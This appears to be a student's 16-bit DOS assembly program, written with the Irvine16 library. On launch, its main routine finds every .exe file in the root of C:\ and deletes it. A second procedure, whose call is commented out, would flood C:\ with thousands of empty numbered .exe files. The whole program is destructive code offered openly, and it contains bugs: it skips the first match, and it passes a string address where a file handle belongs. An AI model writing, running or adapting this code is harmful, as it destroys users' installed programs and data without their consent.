Include Irvine16.inc


.data
fullpath db 'C:/0000000000.exe',0


;----------------- delete ----------
									;These are the data of Delete PROC 
	FileName db "c:\*.exe",0 ;file name
	DTA 	 db 128 dup(?) ;buffer to store the DTA 
	ErrorMsg db "An Error has occurred - exiting.$"
	deleteFile db 13 DUP (?)
			
										;data of concatination

	Dir_Name db "c:\",0							;name of directory to delete file from it x
	Delete_THis_File db 16 dup (?)				;the Full path of deleted File 
	EXtracted_File_Name db 13 DUP(?)			;Name of File which must be deleted 
	
	sizeOF_Dir_Name db 3
	Size_OF_Extracted_Name db ?


.code
main PROC

	mov AX, @data
	mov DS, AX
	
	call Delete_Files
	;call Create_Files

	exit
main ENDP




Create_Files PROC 
	
	
	mov cx,16			
					;; This Loop to make the generation Proccess works in infinite cycle
	f2:
	
		push cx					; Save the value of CX 

	mov si, offset fullpath+3   ; Let the SI points to the first byte of name afer the directory characters
	
	
	mov cx, 10000				; any Big value for the generation loop
	l1:	
		mov bx,0
		mov bl, [si]			; mov the character from [SI] -Path- to the BL Register
		cmp bl,'9'				; Compare the value of BL with the '9'character and if there were equal the SI will mov forward in L2
		je l2
		jmp l3

								; This Loop increases the value of SI -Path Pointer- and compares it with '.' to define if the name range is over or not 
								; if it is over jump to quit 

	l2:
		inc si
		mov bl,[si]
		cmp bl,'.'
		je out1

								;; This Loop works in case the character in BL not equal '9' to increase it's value 
								;; and interrupt to create Files 
	l3:
		mov bl,[si]
		add bl,1
		mov [si],bl
		call crlf
		mov ax, cx
		call writeint
		push cx
		mov dx, offset fullpath
		mov cx ,00h							    ; Make the file attribute to  normal file
		mov AH, 5BH								; The used Interrupt to generate NEW Files 
		int 21h 
		mov AH, 3EH								; Interrupt to close created Files as the maximum number of open files in a program is 20 and you can increase it by 76h
		mov bx, offset fullpath					;Push the file handle to BX as the interrupt can close it 
		int 21h
		pop cx
		
		call writestring
		call crlf
		loop l1
		
		;This label to quit the Loop when The BL register find the '.' character
	out1:
		mov ax, cx
		call crlf
		call writeint
		call crlf
		
		pop cx
	loop f2
ret
Create_Files ENDP


Delete_Files PROC



	mov dx,OFFSET DTA 		; DX points to DTA 
	mov ah,1AH 				; function 1Ah - set DTA
	int 21h 				
	
	
	mov dx,OFFSET FileName 	; DX points filename
	mov ah,4Eh 				; function 4Eh - find first
	int 21h 				; call DOS service

	jc error 				; jump if carry flag is set

LoopCycle:

	mov dx,OFFSET FileName 	; DX points to file name
	mov ah,4Fh 				; function 4fh - find next
	int 21h 				; call DOS service

jc exit_1 					; exit if carry flag is set

	mov cx,13 				; length of filename  which can't be out of range between 30 to 42 bits in DTA
	mov si,OFFSET DTA+30 	; SI points to filename in DTA
	xor bh,bh 				; set the value of bh to zero
	mov ah,0Eh 				; function 0Eh - write character
	call crlf				; EndLine
NextChar:

	lodsb 					; AL = next character in string
	int 10h 				; call BIOS service

loop NextChar

	mov di,OFFSET DTA+30 	; DI Points to the file name in Data segment
	mov AX, 0

					; Copy the FileName From DTA To EXtracted_File_Name
	push DI
	push SI
	mov SI, OFFSET DTA+30
	mov DI, OFFSET EXtracted_File_Name
	mov CX, 13
	LL:
		mov BL, [SI]
		mov [DI], BL
		add SI, 1
		add DI, 1
	Loop LL

	pop DI
	pop SI



	call Concatinate									;call Concatinate PROC

	mov DX, OFFSET Delete_THis_File
	mov AH, 41h											; Function 41h - Delete File
	int 21h
	call writeint
	
	mov cx,13 											; length of filename
	

	
	jmp LoopCycle 										; continue searching

error: 

	mov dx,OFFSET ErrorMsg 								; display error message
	mov ah,09h											; 09h interrupt to writechar
	int 21h

exit_1:

	mov ax,4C00h 										; This interrupt Request the Operating System to Terminate The Program
	int 21h

ret
Delete_Files ENDP


;-----------------------------------------------------------------------------------------------------------
		;This procedure takes the file directory and file name and put them into one string				----	
		; Then send it back so that file could be deleted												----	
		; using strings --> Dir_Name, Delete_THis_File, EXtracted_File_Name								----	
;-----------------------------------------------------------------------------------------------------------
Concatinate PROC

	
	movzx CX, sizeOF_Dir_Name
	mov SI, OFFSET Dir_Name
	mov DI, OFFSEt Delete_THis_File

	L1:
		mov AL,[SI]
		mov [DI], AL
		add SI, 1
		add DI, 1
	Loop L1

	mov SI, OFFSET EXtracted_File_Name
	
	mov Size_OF_Extracted_Name, LENGTHOF EXtracted_File_Name
	movzx CX, Size_OF_Extracted_Name
	L2:
		mov AL,[SI]
		mov [DI], AL
		add SI, 1
		add DI, 1
	Loop L2

ret
Concatinate ENDP


END main
